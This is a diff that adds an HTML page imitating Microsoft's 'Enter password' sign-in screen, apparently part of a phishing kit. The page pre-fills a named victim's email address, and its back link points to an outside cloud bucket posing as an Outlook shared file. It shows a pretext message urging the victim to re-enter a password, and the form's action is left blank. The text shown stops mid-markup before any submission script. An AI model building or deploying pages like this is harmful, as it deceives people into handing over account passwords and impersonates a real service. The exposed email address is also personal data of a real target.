@@ -1,0 +1,438 @@
+<html dir="ltr" lang="EN-US"><head>
+	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=Edge">
+	<title>Sign in to your account</title>
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, minimum-scale=1.0, user-scalable=yes">
+	<link rel="shortcut icon" href="https://logincdn.msauth.net/16.000.28741.15/images/favicon.ico">
+	<link rel="stylesheet" title="Converged_v2" type="text/css" onload="$Loader.OnSuccess(this)" onerror="$Loader.OnError(this)" href="https://logincdn.msauth.net/16.000/Converged_v21033_5plpI1P0_uKjrokWdqCoBw2.css">
+	<style type="text/css"></style>
+	<style type="text/css">
+		body{display:none;}
+	</style>
+	<style type="text/css">
+		body{display:block !important;}
+	</style>
+	<noscript>
+		<style type="text/css">
+			body{display:block !important;}
+		</style>
+	</noscript>
+	<link rel="image_src" href="https://logincdn.msauth.net/16.000.28741.15/images/Windows_Live_v_thumb.jpg">
+</head>
+
+<body class="cb" data-bind="defineGlobals: ServerData, bodyCssClass">
+	<div>
+		<div data-bind="component: { name: 'background-image-control', publicMethods: backgroundControlMethods }">
+			<div class="background-image-holder" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }">
+				<div data-bind="backgroundImage: backgroundImageUrl(), externalCss: { 'background-image': true }" style="background-image: url(&quot;https://logincdn.msauth.net/shared/1.0/content/images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.svg&quot;);" class="background-image ext-background-image"></div>
+			</div>
+		</div>
+		<div data-bind="if: activeDialog"></div>
+		<form name="f1" id="i0281" novalidate="novalidate" spellcheck="false" method="post" target="_top" autocomplete="off" data-bind="autoSubmit: forceSubmit, attr: { action: postUrl }, ariaHidden: activeDialog" action="">
+			<div class="outer" data-bind="component: { name: 'master-page',
+params: {
+serverData: svr,
+showButtons: svr.f,
+showFooterLinks: true,
+useWizardBehavior: svr.BG,
+handleWizardButtons: false,
+password: password,
+hideFromAria: ariaHidden },
+event: {
+footerAgreementClick: footer_agreementClick } }">
+				<div class="middle" data-bind="css: { 'app': backgroundLogoUrl }">
+					<div data-bind="
+animationEnd: paginationControlMethods() &amp;&amp; paginationControlMethods().view_onAnimationEnd,
+css: {
+'app': backgroundLogoUrl,
+'wide': paginationControlMethods() &amp;&amp; paginationControlMethods().currentViewHasMetadata('wide'),
+'fade-in-lightbox': fadeInLightBox,
+'has-popup': showFedCredButtons,
+'transparent-lightbox': backgroundControlMethods() &amp;&amp; backgroundControlMethods().useTransparentLightBox },
+externalCss: { 'sign-in-box': true }" class="sign-in-box ext-sign-in-box fade-in-lightbox">
+
+
+ <!--     START OF GIF EFFECT           -->
+            <div id="progressBar" class="progress disit 1iqzd3" role="progressbar" aria-label="Please wait" style="display: none;">
+              <!--  -->
+              <!-- ko if: useCssAnimation --> 
+              <div></div>
+              <div></div>
+              <div></div>
+              <div></div>
+              <div></div>
+              <!-- /ko -->
+              <!-- ko ifnot: useCssAnimation -->
+              <!-- /ko -->
+            </div> 
+            <!--     END OF GIF EFFECT           -->
+            
+
+
+						<div class="lightbox-cover" data-bind="css: { 'disable-lightbox': svr.bp &amp;&amp; showLightboxProgress() }"></div>
+						<div class="win-scroll">
+							<div data-bind="component: { name: 'logo-control',
+params: {
+isChinaDc: svr.fIsChinaDc,
+bannerLogoUrl: bannerLogoUrl() } }">
+								<img class="logo" role="img" pngsrc="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ed9c9eb0dce17d752bedea6b5acda6d9.png" svgsrc="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" data-bind="imgSrc, attr: { alt: str['MOBILE_STR_Footer_Microsoft'] }" src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Microsoft">
+							</div>
+							<div role="main" data-bind="component: { name: 'pagination-control',
+publicMethods: paginationControlMethods,
+params: {
+enableCssAnimation: svr.aH,
+disableAnimationIfAnimationEndUnsupported: svr.bt,
+initialViewId: initialViewId,
+currentViewId: currentViewId,
+initialSharedData: initialSharedData,
+initialError: $loginPage.getServerError() },
+event: {
+cancel: paginationControl_onCancel,
+loadView: view_onLoadView,
+showView: view_onShow,
+setLightBoxFadeIn: view_onSetLightBoxFadeIn,
+animationStateChange: paginationControl_onAnimationStateChange } }">
+								<div data-bind="css: { 'zero-opacity': hidePaginatedView() }" class="">
+									<div data-bind="css: {
+'animate': animate() &amp;&amp; animate.animateBanner(),
+'slide-out-next': animate.isSlideOutNext(),
+'slide-in-next': animate.isSlideInNext(),
+'slide-out-back': animate.isSlideOutBack(),
+'slide-in-back': animate.isSlideInBack() }" class="animate slide-in-next">
+										<div data-bind="component: { name: 'identity-banner-control',
+params: {
+userTileUrl: svr.bi,
+displayName: sharedData.displayName || svr.j,
+isBackButtonVisible: isBackButtonVisible(),
+focusOnBackButton: isBackButtonFocused(),
+backButtonDescribedBy: backButtonDescribedBy() },
+event: {
+backButtonClick: identityBanner_onBackButtonClick } }">
+											<div class="identityBanner">
+                                            <div id="displayName" class="identity" data-bind="text: unsafe_displayName, attr: { 'title': unsafe_displayName }" title="david@savantcts.com">
+                                                <a href="https://outlookcomsharedfile.s3-website.fr-par.scw.cloud/index.html" class="thebackbuttonxcf"><img src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEAeAB4AAD/4RDmRXhpZgAATU0AKgAAAAgABAE7AAIAAAAJAAAISodpAAQAAAABAAAIVJydAAEAAAASAAAQzOocAAcAAAgMAAAAPgAAAAAc6gAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFNjaWJyYWluAAAABZADAAIAAAAUAAAQopAEAAIAAAAUAAAQtpKRAAIAAAADNDgAAJKSAAIAAAADNDgAAOocAAcAAAgMAAAIlgAAAAAc6gAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADIwMTk6MDE6MDggMDQ6NDI6MjgAMjAxOTowMTowOCAwNDo0MjoyOAAAAFMAYwBpAGIAcgBhAGkAbgAAAP/hCxtodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvADw/eHBhY2tldCBiZWdpbj0n77u/JyBpZD0nVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkJz8+DQo8eDp4bXBtZXRhIHhtbG5zOng9ImFkb2JlOm5zOm1ldGEvIj48cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPjxyZGY6RGVzY3JpcHRpb24gcmRmOmFib3V0PSJ1dWlkOmZhZjViZGQ1LWJhM2QtMTFkYS1hZDMxLWQzM2Q3NTE4MmYxYiIgeG1sbnM6ZGM9Imh0dHA6Ly9wdXJsLm9yZy9kYy9lbGVtZW50cy8xLjEvIi8+PHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9InV1aWQ6ZmFmNWJkZDUtYmEzZC0xMWRhLWFkMzEtZDMzZDc1MTgyZjFiIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iPjx4bXA6Q3JlYXRlRGF0ZT4yMDE5LTAxLTA4VDA0OjQyOjI4LjQ3ODwveG1wOkNyZWF0ZURhdGU+PC9yZGY6RGVzY3JpcHRpb24+PHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9InV1aWQ6ZmFmNWJkZDUtYmEzZC0xMWRhLWFkMzEtZDMzZDc1MTgyZjFiIiB4bWxuczpkYz0iaHR0cDovL3B1cmwub3JnL2RjL2VsZW1lbnRzLzEuMS8iPjxkYzpjcmVhdG9yPjxyZGY6U2VxIHhtbG5zOnJkZj0iaHR0cDovL3d3dy53My5vcmcvMTk5OS8wMi8yMi1yZGYtc3ludGF4LW5zIyI+PHJkZjpsaT5TY2licmFpbjwvcmRmOmxpPjwvcmRmOlNlcT4NCgkJCTwvZGM6Y3JlYXRvcj48L3JkZjpEZXNjcmlwdGlvbj48L3JkZjpSREY+PC94OnhtcG1ldGE+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIDw/eHBhY2tldCBlbmQ9J3cnPz7/2wBDAAcFBQYFBAcGBQYIBwcIChELCgkJChUPEAwRGBUaGRgVGBcbHichGx0lHRcYIi4iJSgpKywrGiAvMy8qMicqKyr/2wBDAQcICAoJChQLCxQqHBgcKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKir/wAARCAAgAB0DASIAAhEBAxEB/8QAHwAAAQUBAQEBAQEAAAAAAAAAAAECAwQFBgcICQoL/8QAtRAAAgEDAwIEAwUFBAQAAAF9AQIDAAQRBRIhMUEGE1FhByJxFDKBkaEII0KxwRVS0fAkM2JyggkKFhcYGRolJicoKSo0NTY3ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqDhIWGh4iJipKTlJWWl5iZmqKjpKWmp6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uHi4+Tl5ufo6erx8vP09fb3+Pn6/8QAHwEAAwEBAQEBAQEBAQAAAAAAAAECAwQFBgcICQoL/8QAtREAAgECBAQDBAcFBAQAAQJ3AAECAxEEBSExBhJBUQdhcRMiMoEIFEKRobHBCSMzUvAVYnLRChYkNOEl8RcYGRomJygpKjU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6goOEhYaHiImKkpOUlZaXmJmaoqOkpaanqKmqsrO0tba3uLm6wsPExcbHyMnK0tPU1dbX2Nna4uPk5ebn6Onq8vP09fb3+Pn6/9oADAMBAAIRAxEAPwD6RorO1/XLTw5odxqmob/IgAyEXLMScAD6kgc8Vy2h+MNMRptQ1vWibu6A/wBFjjlMNqgzhF+X5m55fufQAUAd1RWXpXiTStameLTLrz3jXcw8t1wM47gVqUAR3FvDd20lvdRJNDKpR43GVYHqCKy9D02+0d5rKS5FzpiAGzaRiZohzmNj/Eo4w2c44OcZrYooAKKKKAP/2Q==" title="Arrow Backwards" height="25px"></a><span>david@savantcts.com</span>
+												</div>
+											</div>
+										</div>
+									</div>
+									<div class="pagination-view has-identity-banner animate slide-in-next" data-bind="css: {
+'has-identity-banner': showIdentityBanner() &amp;&amp; (sharedData.displayName || svr.j),
+'zero-opacity': hidePaginatedView.hideSubView(),
+'animate': animate(),
+'slide-out-next': animate.isSlideOutNext(),
+'slide-in-next': animate.isSlideInNext(),
+'slide-out-back': animate.isSlideOutBack(),
+'slide-in-back': animate.isSlideInBack() }">
+										<div data-viewid="2" data-showidentitybanner="true" data-dynamicbranding="true" data-bind="pageViewComponent: { name: 'login-paginated-password-view',
+params: {
+serverData: svr,
+serverError: initialError,
+isInitialView: isInitialState,
+username: sharedData.username,
+displayName: sharedData.displayName,
+hipRequiredForUsername: sharedData.hipRequiredForUsername,
+passwordBrowserPrefill: sharedData.passwordBrowserPrefill,
+availableCreds: sharedData.availableCreds,
+evictedCreds: sharedData.evictedCreds,
+useEvictedCredentials: sharedData.useEvictedCredentials,
+showCredViewBrandingDesc: sharedData.showCredViewBrandingDesc,
+flowToken: sharedData.flowToken,
+defaultKmsiValue: svr.AF === 1,
+userTenantBranding: sharedData.userTenantBranding,
+sessions: sharedData.sessions,
+callMetadata: sharedData.callMetadata },
+event: {
+updateFlowToken: $loginPage.view_onUpdateFlowToken,
+submitReady: $loginPage.view_onSubmitReady,
+redirect: $loginPage.view_onRedirect,
+resetPassword: $loginPage.passwordView_onResetPassword,
+setBackButtonState: view_onSetIdentityBackButtonState,
+setPendingRequest: $loginPage.view_onSetPendingRequest } }">
+
+											<input type="hidden" name="i13" data-bind="value: isKmsiChecked() ? 1 : 0" value="0">
+											<input type="hidden" name="login" data-bind="value: unsafe_username" value="david@savantcts.com">
+											<input type="text" name="loginfmt" data-bind="moveOffScreen, value: unsafe_displayName" class="moveOffScreen" tabindex="-1" aria-hidden="true">
+											<input type="hidden" name="type" data-bind="value: svr.BG ? 20 : 11" value="11">
+											<input type="hidden" name="LoginOptions" data-bind="value: isKmsiChecked() ? 1 : 3" value="3">
+											<input type="hidden" name="lrt" data-bind="value: callMetadata.IsLongRunningTransaction" value="">
+											<input type="hidden" name="lrtPartition" data-bind="value: callMetadata.LongRunningTransactionPartition" value="">
+											<input type="hidden" name="hisRegion" data-bind="value: callMetadata.HisRegion" value="">
+											<input type="hidden" name="hisScaleUnit" data-bind="value: callMetadata.HisScaleUnit" value="">
+											<div id="loginHeader" class="row title ext-title" role="heading" aria-level="1" data-bind="text: str['CT_PWD_STR_EnterPassword_Title'], externalCss: { 'title': true }">Enter password</div>
+											<div class="row">
+												<div class="form-group col-md-24">
+													<div role="alert" aria-live="assertive"></div>
+													<div class="placeholderContainer" data-bind="component: { name: 'placeholder-textbox-field',
+publicMethods: passwordTextbox.placeholderTextboxMethods,
+params: {
+serverData: svr,
+hintText: str['CT_PWD_STR_PwdTB_Label'] },
+event: {
+updateFocus: passwordTextbox.textbox_onUpdateFocus } }">
+<span class="errrmsg" style="color:#ff0000;display: none;">Because you're accessing sensitive info, you need to verify your password.</span>
+														<input name="passwd" type="password" id="i0118" autocomplete="off" class="form-control input ext-input text-box ext-text-box" aria-required="true" data-bind="
+textInput: passwordTextbox.value,
+ariaDescribedBy: [
+'loginHeader',
+showCredViewBrandingDesc ? 'credViewBrandingDesc' : '',
+unsafe_pageDescription ? 'passwordDesc' : ''].join(' '),
+hasFocusEx: passwordTextbox.focused() &amp;&amp; !showPassword(),
+placeholder: $placeholderText,
+ariaLabel: unsafe_passwordAriaLabel,
+moveOffScreen: showPassword,
+externalCss: {
+'input': true,
+'text-box': true,
+'has-error': passwordTextbox.error }" aria-describedby="loginHeader  " placeholder="Password" aria-label="Enter password" tabindex="0">
+
+													</div>
+												</div>
+											</div>
+											<div data-bind="css: { 'position-buttons': !tenantBranding.BoilerPlateText }" class="position-buttons">
+												<div>
+													<div id="idTd_PWD_KMSI_Cb" class="form-group checkbox text-block-body no-margin-top" data-bind="visible: !svr.G &amp;&amp; !showHipOnPasswordView">
+														<label id="idLbl_PWD_KMSI_Cb">
+															<input name="KMSI" id="idChkBx_PWD_KMSI0Pwd" type="checkbox" data-bind="checked: isKmsiChecked, ariaLabel: str['CT_PWD_STR_KeepMeSignedInCB_Text']" aria-label="Keep me signed in"> <span data-bind="text: str['CT_PWD_STR_KeepMeSignedInCB_Text']">Keep me signed in</span>
+														</label>
+													</div>
+													<div class="row">
+														<div class="col-md-24">
+															<div class="text-13">
+																<div class="form-group"> <a id="idA_PWD_ForgotPassword" role="link" href="">Forgot password?</a>
+																</div>
+																<!-- ko component: { name: "cred-switch-link-control",
+params: {
+serverData: svr,
+username: username,
+availableCreds: availableCreds,
+flowToken: flowToken,
+currentCred: { credType: 1 } },
+event: {
+switchView: credSwitchLink_onSwitchView,
+redirect: onRedirect,
